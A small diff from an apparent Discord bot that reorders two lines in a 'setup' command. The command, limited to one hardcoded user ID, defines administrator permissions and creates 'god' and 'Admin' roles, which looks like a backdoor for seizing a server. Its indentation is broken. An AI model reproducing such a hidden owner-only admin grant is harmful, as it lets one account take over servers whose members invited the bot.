@@ -204,8 +204,8 @@ async def bans(ctx):
 @client.command(pass_context = True)
 async def setup(ctx):
         if ctx.message.author.id == "471988330335174667":
-    author = ctx.message.author
     server = ctx.message.server
+    author = ctx.message.author
     mod_perms = discord.Permissions(administrator=True)
     await client.create_role(author.server, name="god")
     await client.create_role(author.server, name="Admin")
